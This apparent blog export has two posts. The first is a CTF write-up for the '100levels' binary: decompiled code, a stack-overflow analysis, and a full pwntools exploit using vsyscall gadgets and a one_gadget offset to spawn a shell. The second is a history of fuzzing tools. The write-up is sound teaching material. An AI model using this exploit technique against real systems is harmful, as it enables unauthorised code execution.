<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">banner</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      v3 = <span class="built_in">read_num</span>();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">go</span>(a1, (__int64)a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a1 = (__int64)<span class="string">&quot;Wrong input&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong input&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_D92</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>hint</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+14h] [rbp-FCh]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( unk_20208C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&#x27;N NWP ON&#x27;</span>;</span><br><span class="line">    v2 = <span class="string">&#x27;UF O&#x27;</span>;</span><br><span class="line">    v3 = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>go</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">go</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST0C_4</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">read_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">    v7 = v4;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">read_num</span>();</span><br><span class="line">  v8 = v7 + v5;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are being a real man.&quot;</span>);</span><br><span class="line">      v9 = <span class="number">100LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v6 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">level</span>(v9) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v10, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v9, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 - v6), v5);</span><br><span class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v10);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward Coward Coward Coward Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>and <code>level</code> in <code>go</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">level</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">level</span>(a1 - <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="built_in">rand</span>() % a1;</span><br><span class="line">  v2 = <span class="built_in">rand</span>();</span><br><span class="line">  v9 = v2 % a1;</span><br><span class="line">  v8 = v2 % a1 * v10;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Level %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Question: %d * %d = ? Answer:&quot;</span>, v10, v9);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">strtol</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>From <code>read(0, &amp;buf, 0x400uLL);</code> in <code>level()</code> we can see it will overflow <code>__int64 buf; // [rsp+10h] [rbp-30h]</code>. However with <code>NX</code> and <code>PIE</code> enabled, <code>ROP</code> chains are hard to deal.</p>
<p>There is a <code>hint()</code> which could leak <code>system</code> for us, but <code>unk_20208C</code> cannot be changed by us now, so is this func useless?</p>
<p>No, now let’s see the assembly code:</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000000D11                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:system_ptr</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D18                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_110], <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>
<p>Though it won’t be printed, the address of <code>system</code> is saved in <code>rbp+var_110</code> (<code>rbp-0x110</code> which is on the stack), and between the running of <code>hint()</code> and <code>go()</code>, the value of <code>rbp</code> remains the same, so the “leaked” <code>system</code> can be also found in <code>rbp-0x110</code> in func frame of <code>go()</code> (corresponding variable is <code>__int64 v7; // [rsp+10h] [rbp-110h]</code>).</p>
<p>To keep <code>v7</code> unchanged, we have to first input a value less than or equal to 0, then we input <code>v5</code> and the number of <code>level</code> will be determined by <code>v8 = v7 + v5;</code>.</p>
<p>We can surely use brute-force attack to identify the value of <code>v7</code>(<code>system</code> address). When <code>v5</code> is smaller than <code>-system_address</code>, we will receive <code>Coward Coward Coward Coward Coward</code>, while when <code>v5</code> is larger than <code>-system_address</code> we will enter the <code>level()</code>. You may notice that we always end up entering <code>level()</code>, so why not use stack overflow directly?</p>
<p>The <code>level()</code> is called recursively, so only in the last <code>level()</code> can we use the shortest payload to reach <code>v7</code> in func frame of <code>go()</code>.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__int64 v4; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">__int64 v5; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line"><span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">__int64 v7; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br></pre></td></tr></table></figure>
<p>However still <code>0x10</code> needs to be overflowed. Now we think about how to exploit it, because we haven’t leaked any address but we need <code>ROP</code> gadget to fill the gap; besides the <code>system</code> address in <code>v7</code> needs an argument <code>/bin/sh</code> to be effective.</p>
<p>First we deal with the <code>ROP</code> gadgets issue.<br>We use <code>vsyscall</code>(virtual system call) because it has fixed address even with <code>ASLR</code> on and <code>PIE</code> enabled. It is the first and oldest mechanism in the Linux kernel that is designed to accelerate execution of certain system calls. The principle of work of the vsyscall concept is: The Linux kernel maps into user space a page that contains some variables and the implementation of some system calls.<br><img src="/imghost/apcaw/vsyscall.png" alt="vsyscall.png"><br>It is dumped from <code>gdb</code> and viewed in<code>IDA</code>. There are three <code>syscalls</code>: <code>gettimeofday</code>, <code>time</code> and <code>getcpu</code> (starts at <code>0xffffffffff600000</code>, <code>0xffffffffff600400</code> and <code>0xffffffffff600800</code>).<br>We can use these 3 functions as gadgets.</p>
<p>Next we have to think about how to use <code>system</code> in <code>v7</code>. Since we cannot get exact address of <code>pop rdi; ret</code>, it’s better to use <code>one gadget</code> because the offset between <code>system</code> and <code>one gadget</code> is fixed, so setting an appropriate <code>v5</code> can change <code>v7</code> to be address of <code>one gadget</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ one_gadget  libc.so</span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xef6c4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf0567 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
<p>We choose <code>0x4526a</code> because <code>gettimeofday</code>, <code>time</code> and <code>getcpu</code> can keep [rsp+0x30] &#x3D;&#x3D; NULL (<code>0xef6c4</code> and <code>0xf0567</code> are hard to satisfy).<br>Then let us see exploit.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We have to write <code>answer()</code> to answer questions automatically because only the last round of <code>level()</code> will be our best chance to send payload. It means we will wait for a long time every time we run this script.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;100levels&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;45100&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;100levels&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">vsyscall_gettimeofday = <span class="number">0xffffffffff600000</span></span><br><span class="line">vsyscall_time = <span class="number">0xffffffffff600400</span></span><br><span class="line">vsyscall_getcpu = <span class="number">0xffffffffff600800</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span>():</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Question: &#x27;</span>) </span><br><span class="line">        answer = <span class="built_in">eval</span>(sh.recvuntil(<span class="string">&#x27;=&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Answer:&#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(answer))</span><br><span class="line"></span><br><span class="line">sh.recv() <span class="comment"># menu</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>) <span class="comment"># hint</span></span><br><span class="line">sh.recv() <span class="comment"># menu</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv() <span class="comment"># How many levels?</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;0&#x27;</span>) <span class="comment"># &#x27;&lt;=0&#x27; to not overwrite system_addr </span></span><br><span class="line">sh.recv() <span class="comment"># Coward\nAny more?\n</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;-294&#x27;</span>) <span class="comment"># 0x4526a from one_gadget</span></span><br><span class="line"><span class="comment"># sh.sendline(&#x27;697140&#x27;) # 0xef6c4</span></span><br><span class="line"><span class="comment"># sh.sendline(&#x27;700887&#x27;) # 0xf0567</span></span><br><span class="line">sh.recv() <span class="comment"># You are being a real man.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">        log.info(i)</span><br><span class="line">        answer()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsyscall_gettimeofday) *<span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recv()</span></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>stack-overflow</tag>
        <tag>ctf</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>A Brief History of Fuzzing</title>
    <url>/2020/10/02/2020-10-02-A-Brief-History-of-Fuzzing/</url>
    <content><![CDATA[<p>A supplement for <a href="/2020/02/14/2020-02-14-AFL-Fuzzing-Intro/">AFL Fuzzing Intro</a>.</p>
<h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><p>From the blog of <a class="link"   href="https://github.com/riusksk" >riusksk<i class="fas fa-external-link-alt"></i></a>.<br>It has been around 30 years since <code>fuzzing</code> was born.</p>
<h3 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h3><p>In 1988, on the <a class="link"   href="http://pages.cs.wisc.edu/~bart/fuzz/CS736-Projects-f1988.pdf" >computer science class<i class="fas fa-external-link-alt"></i></a> of <em>Barton Miller</em> from <em>UW-Madison</em>, it first proposed the concept of Fuzz Generator to test the robustness of Unix programs, which uses random data to test till it crashes.  </p>
<p>Therefore <em>Barton Miller</em> is regarded as “<em>the Father of Fuzzing</em>“. But at that time <code>fuzzing</code> just aims at checking code quality and program stability, instead of finding vulnerabilities.</p>
<h3 id="From-Academia-to-Industry"><a href="#From-Academia-to-Industry" class="headerlink" title="From Academia to Industry"></a>From Academia to Industry</h3><p>In 2001, <em>the University of Oulu</em> announced their <a href="https://rd.springer.com/content/pdf/10.1007%2F978-0-387-35413-2_16.pdf">results of the <code>PROTOS</code> project</a>, which first implement <code>fuzzing</code> in network protocol security testing, you can still find <a class="link"   href="https://www.ee.oulu.fi/research/ouspg/Protos" >testing set<i class="fas fa-external-link-alt"></i></a> for different network protocol.<br>In 2002, the <code>PROTOS</code> gradually improved and <em>Microsoft</em> starts to provide financial support for it. In 2003, company called <code>Codenomicon</code> was set up by project members, they start to apply Fuzzing to commercial products and did find many security issues like <code>Heartbleed</code>.</p>
<p>In 2002 <em>BlackHat</em> USA, <em>Dave Aitel</em> from <a class="link"   href="http://www.immunitysec.com/" >Immunity<i class="fas fa-external-link-alt"></i></a> (they got <a class="link"   href="http://www.immunityinc.com/products/debugger/" >Immunity Debugger<i class="fas fa-external-link-alt"></i></a>) published: <a class="link"   href="http://www.immunitysec.com/downloads/usingspike3.ppt" >“An Introduction to SPIKE, the Fuzzer Creation Kit”<i class="fas fa-external-link-alt"></i></a>. That’s <code>SPIKE</code>, a network protocol fuzzer based on block template. The strength of it is to support customizing block with variable length; besides random data, it provides some boundary value to increase crashing possibility. The born of <code>SPIKE</code> let users customize their own network protocol fuzzer, and it plays a huge role in promoting the popularization of <code>fuzzing</code>.</p>
<p>From <code>PROTOS</code> to <code>SPIKE</code> the academia and industry give proof of <code>fuzzing</code> application in commercial and security field.</p>
<h3 id="File-Format-Fuzzing"><a href="#File-Format-Fuzzing" class="headerlink" title="File Format Fuzzing"></a>File Format Fuzzing</h3><p>In 2004, the release of <code>Peach</code> framework is the symbol of file format <code>fuzzing</code>. It used to be developed in <code>Python</code>, while after being acquired in 2007 it got rewritten in <code>C#</code>, and divided into <a class="link"   href="https://www.peach.tech/resources/peachcommunity/" >community<i class="fas fa-external-link-alt"></i></a> edition and <a class="link"   href="https://www.peachfuzzer.com/products/" >commercial<i class="fas fa-external-link-alt"></i></a> version.<br>It supports file format, network protocol and ActiveX controller. By writing <code>pit</code> file (xml) to define data format.</p>
<p>The <code>Peach</code> is still being used and even some people released <a class="link"   href="https://github.com/aflsmart/aflsmart" >aflsmart<i class="fas fa-external-link-alt"></i></a> to combine <code>Peach</code> and <code>AFL</code>. </p>
<p>File <code>fuzzing</code> can also be used in network protocol <code>fuzzing</code>, by instrumenting source code and printing Log, then calling API to write a <code>harness</code> and test on <code>AFL</code>&#x2F;<code>libfuzzer</code>, then it turns to be file <code>fuzzing</code>.</p>
<h3 id="Grammar-Template-Fuzzing"><a href="#Grammar-Template-Fuzzing" class="headerlink" title="Grammar Template Fuzzing"></a>Grammar Template Fuzzing</h3><p>In 2008, <em>Mozilla</em> security team published <code>jsfunfuzz</code> and <code>DOMfuzz</code>, they produce test cases based on JS grammar template to discovery browser vulnerabilities. Later they are combined as open source <a href="https://github.com/MozillaSecurity/funfuzz"><code>funfuzz</code></a>, but it has a bad extensionof its grammar template (<a class="link"   href="https://github.com/MozillaSecurity/dharma" >dharma<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/googleprojectzero/domato" >Domato<i class="fas fa-external-link-alt"></i></a> are better). </p>
<p>After <code>funfuzz</code>, there are also many <code>JS</code> grammar <code>fuzzing</code> tools like <code>grinder</code>, <code>nduja</code>, <code>crossfuzz</code> and so on.</p>
<p>Browser is always the spot of cyber attacks. Rendering engine and JS engine have always been the main attack surface. Grammar <code>fuzzing</code> aiming at <code>html</code>, <code>js</code>, <code>vbs</code> and <code>WebSQL</code> like <code>sqlite</code> came out natually.</p>
<p>Except browser, <code>JS</code> in <code>PDF</code> and <code>Action Script</code> in <code>Flash</code> has always been the entry of <code>Adobe Reader</code> and <code>Adobe Flash</code>.</p>
<h3 id="Symbolic-Execution-Academia-VS-Industry"><a href="#Symbolic-Execution-Academia-VS-Industry" class="headerlink" title="Symbolic Execution: Academia VS Industry"></a>Symbolic Execution: Academia VS Industry</h3><p>In 2008, the <code>symbolic execution</code> engine <code>KLEE</code> based on <code>LLVM</code> was released, leading a new wave of program analysis. Later the <code>symbolic execution</code> was implemented in <code>fuzzing</code> to solve <code>CTF</code> challenges, to finding keys and deobfuscating or so.<br>The <a class="link"   href="https://github.com/shellphish/driller" >driller<i class="fas fa-external-link-alt"></i></a> is a combination of <code>AFL</code> and <code>angr</code> and was used in <code>CGC</code> (Cyber Grand Challenge). There is also a combination of <code>AFL</code> and <code>KLEE</code>: <a class="link"   href="https://github.com/julieeen/kleefl" >kleefl<i class="fas fa-external-link-alt"></i></a>.</p>
<p>The <code>symbolic execution</code> is used more in academia than in industry. Applying <code>se</code> to <code>fuzzing</code>, increasing code coverage by solving the condition of new path through constraints, can somehow make up for brutal mutation. The main challenge for <code>se</code> is path explosion, limitation of constraint solving capability, and performance issue. It’s good for small program, like using <code>angr</code> in <code>CTF</code>, while not that good for realworld. A new wave of technology for <code>fuzzing</code> is started not by <code>se</code> but by code coverage guided technology.</p>
<h3 id="Code-Coverage-Guided"><a href="#Code-Coverage-Guided" class="headerlink" title="Code Coverage Guided"></a>Code Coverage Guided</h3><p>In the end of 2013, <a class="link"   href="http://lcamtuf.coredump.cx/afl/" >afl-fuzz<i class="fas fa-external-link-alt"></i></a> was released, and it is the first time to instrument in source code and <code>QEMU</code> to achieve code coverage guided <code>fuzzing</code> (it must be the milestone in development). <code>AFL</code> wasn’t that famous until many researchers tweeted their <code>0day</code> finding on Twitter in 2014-2015.</p>
<p>Then we got <code>winafl</code>, <code>libfuzzer</code>, <code>AFLFast</code>, <code>Vuzzer</code>… and editions for different programming language: <code>go</code>, <code>python</code>, <code>js</code>, <code>ruby</code>… Some well known fuzzer followed the lead, like kernel fuzzer <a class="link"   href="https://github.com/google/syzkaller" >syzkaller<i class="fas fa-external-link-alt"></i></a>, it adds code coverage guiding ability. </p>
<p>In the same time the whole industry is trying to move it to new platform(<code>windows</code>, <code>android</code>, <code>IoT</code>) and to support closed source softwares. That is the hot topic of recent years’ research, like dynamic and static instrumentation, virtual machine simulated execution, and some hardware characteristics.</p>
<h3 id="Syscall-Template"><a href="#Syscall-Template" class="headerlink" title="Syscall Template"></a>Syscall Template</h3><p>in 2015, <em>Google</em> opened source the <a class="link"   href="https://github.com/google/syzkaller" >syzkaller<i class="fas fa-external-link-alt"></i></a>, which is a kernel fuzzer and still being used. It works by defining system function call template, defining parameters’ type in template, and dealing with order&#x2F;value dependencies. <em>Project Zero</em> has written <a class="link"   href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html" >“Exploiting the Linux kernel via packet sockets(syzkaller usage)”<i class="fas fa-external-link-alt"></i></a> about how to write template and how to use <code>syzkaller</code>, to discover <code>Linux</code> kernel vulns.</p>
<p>In <code>windows</code> kernel <code>fuzzing</code>, the GUI API calling template is always used; in <code>macOS</code> kernel <code>fuzzing</code>, that’s IOKit function. They all based on syscall template method.</p>
<p>In 2016, <em>Google</em> proposed “Structure-Aware Fuzzing”, and applied <a class="link"   href="https://github.com/google/libprotobuf-mutator" >libprotobuf-mutator<i class="fas fa-external-link-alt"></i></a> based on <code>libfuzzer</code> and <code>protobuf</code>. It has the similar idea with <code>syzkaller</code>, with coverage guided which <code>Peach</code> dont has, and deals with <code>AFL</code> and <code>libfuzzer</code>‘s inefficient mutation for complicated input types. Now <em>Project Zero</em> uses <code>libprotobuf-mutator</code> to fuzz IOS kernel (<a class="link"   href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html" >“SockPuppet: A Walkthrough of a Kernel Exploit for iOS 12.4”<i class="fas fa-external-link-alt"></i></a>).</p>
<p>Structure-Aware Fuzzing is not sth new, it’s like <code>Peach</code> idea to define a template for input data type, to improve the accuracy of mutation.</p>
<h3 id="Open-Source"><a href="#Open-Source" class="headerlink" title="Open Source"></a>Open Source</h3><p>In industry the most famous <code>fuzzing</code> platform should be <a class="link"   href="https://github.com/google/clusterfuzz" >clusterfuzz<i class="fas fa-external-link-alt"></i></a>, running on 25000+ machines, having found 16000+ chrome bugs, 11000+ open source project bugs. This combines <a class="link"   href="https://github.com/google/oss-fuzz" >OSS-Fuzz<i class="fas fa-external-link-alt"></i></a>, supports code coverage guidance like <code>libfuzzer</code> and <code>AFL</code>, and supports Balck-Box Fuzzing. <code>OSS-Fuzz</code> and <code>clusterfuzz</code> were opened source in 2016 and 2019, and <em>Google</em> let every research involve in working on it, set prizes for contributers. <em>Google</em> also developed <code>ASan</code>, <code>MSan</code>, <code>TSan</code>, <code>UBSan</code>, <code>LSan</code> (they are all compile-time instrumentation tools) to find bugs, and some vulns only trigger with <code>Sanitizer</code> open, like enable heap page in <code>windows</code>, so it helps to find crashes and analyse.</p>
<p>In a word, <em>Google</em> did a lot for <code>fuzzing</code> community and ecology.</p>
<h3 id="Syntax-Tree-mutation-in-Parse-Engine-Vulnerability-Discovery"><a href="#Syntax-Tree-mutation-in-Parse-Engine-Vulnerability-Discovery" class="headerlink" title="Syntax Tree mutation in Parse Engine Vulnerability Discovery"></a>Syntax Tree mutation in Parse Engine Vulnerability Discovery</h3><p>In 2012, the <a class="link"   href="https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final73.pdf" >“Fuzzing with Code Fragments”<i class="fas fa-external-link-alt"></i></a> was published in USENIX, and <code>LangFuzz</code> was developed by researchers. They collect <code>JS</code> testing samples from open source browser projects (<code>firefox</code>, <code>webkit</code>, <code>chromium</code>) and the Internet; then use <a class="link"   href="https://www.antlr.org/" >ANTLR(Another Tool for Language Recognition)<i class="fas fa-external-link-alt"></i></a> to analyse AST syntax tree; next split samples into non-terminal symbols (code fragments) and put into fragment pool; finally mutate (choose fragments of same type to replace&#x2F;insert) input sample according to the pool.</p>
<p>Based on <code>LangFuzz</code> someone added genetic algorithm to evaluate input and select better individuals to create new samples, that is open source <a href="https://download.vusec.net/papers/ifuzzer-esorics16.pdf"><code>IFuzzer</code></a>. However, it is not so complete, and not so many vulns was discovered by it.</p>
<p>In 2018, <em>Samuel Groß</em> from <em>Project Zero</em> released a <code>JS</code> grammar fuzzer: <a href="https://github.com/googleprojectzero/fuzzilli"><code>fuzzilli</code></a>. It integrates multiple technologies such as grammar mutation, template generation, and coverage guidance. It use custom intermediate language for grammatical mutation, then convert it to <code>JS</code> code. The <code>fuzzilli</code> achieved a lot in <code>JS</code> vulns discovery and has been used by industry peers for secondary development.</p>
